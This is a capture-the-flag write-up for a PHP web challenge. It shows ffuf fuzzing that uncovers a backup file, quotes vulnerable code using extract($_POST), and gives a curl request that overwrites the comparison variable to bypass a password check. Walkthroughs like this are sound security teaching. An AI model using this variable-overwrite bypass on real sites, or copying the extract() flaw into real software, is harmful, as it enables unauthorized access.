---
title: AirTech CTF '24 Final - Web - HideOut
date: '2024-03-02'
tags: ['AIRTECH24', 'WEB','PHP', 'HideOut','LOGINBYPASS']
draft: false
---

### Description:
> Evil-Corp launched their public website for users to access their data. Unfortunately, BANDITS hackers breached the admin account and stole sensitive information.

![challenge discription](/static/writeups/airtech/HideOut/chall_discription.png)

Starting with a simple analysis, we saw a static web page with a single input field designed for entering a secret password.

![index page](/static/writeups/airtech/HideOut/secretpass.png)

Analyzing the source code, console, and other elements on the client side, we found nothing. After digging for some time, I discovered that we could fuzz this site. Initially, we obtained no results, but after fuzzing for common PHP pages, we found a backup file named `index.php.bak`
### Command:
```bash
ffuf -u http://170.187.248.180:3001/FUZZ -w /usr/share/secLists/Discovery/Web-Content/Common-PHP-Filenames.txt
```
![fuzzing with ffuf](/static/writeups/airtech/HideOut/bak-file.png)

By requesting to that file
### URL:
```bash
http://170.187.248.180:3001/index.php.bak
```
### Source Code: 

![php source code](/static/writeups/airtech/HideOut/source-code.png)

### PHP Code Analysis
```python
<?php
include 'flag.php';

if($_SERVER['REQUEST_METHOD'] == "POST"){
    $fani = rand();
    extract($_POST);
    
    if($secretpasswd == $fani){
        echo('<h1><div class="alert alert-success centered" role="alert"> Flag: '.$flag.' </div></h1>');   
    }else{
        echo('<h1><div class="alert alert-danger centered" role="alert">hehehe, wrong Password!</div></h1>');   
    }    
die;
}
?>

```
Let's break down the code:

- include `flag.php`;: This line includes the contents of the `flag.php` file. The assumption is that this file contains  flag or secret password that the user.

- if`($_SERVER['REQUEST_METHOD'] == "POST"){`: This conditional statement checks if the HTTP request method is POST. The code within this block will execute only if the form is submitted using the POST method.

- `$fani = rand();`: Generates a random number and assigns it to the variable $fani. This value will be used as a reference point for comparison.

- `extract($_POST);`: Extracts variables from the POST data. This is a potentially risky operation as it creates variables from the keys of the associative array `$_POST`.

- if`($secretpasswd == $fani){`: Compares the value submitted in the 'secretpasswd' field with the random value stored in $fani.

- Inside the if block, if the submitted password matches the generated random value, it echoes a success message along with the flag `($flag)`. If not, it echoes an error message.

- `die`;: Terminates the script execution immediately after processing the form, preventing any further code execution.

### Potential issues with the code:

- The use of `extract($_POST)`; can be risky and may lead to security vulnerabilities if not handled carefully.

> PHP has a function named `extract()` to take all provided GET and POST requests and assign them to internal variables. Developers will, at times, use this function instead of manually assigning `$_POST[var1]` to `$var1`. This function will overwrite any previously defined variables, including server variables. `Extract()` has options which prevent overwriting previously-defined variables, however this safety is not enabled by default, and developers might not enable the safety, just as many do not perform input validation. This vulnerability is similar in design to the register globals vulnerabilities present in PHP.

[Source](https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md)


So, our current objective is to set `$secretpasswd` equal to the same value as `$fani`. We can achieve this by crafting a cURL request, as illustrated below.

```bash
curl http://170.187.248.180:3001/index.php  --data 'secretpasswd=t&fani=t'
```
### Response
![flag](/static/writeups/airtech/HideOut/flag.png)
Hence, we obtained our flag, marking our first blood in this challenge. Got a Bugcrowd sticker too! xD.

### ***kh4tt4k***

### Peace! 👋👋👋
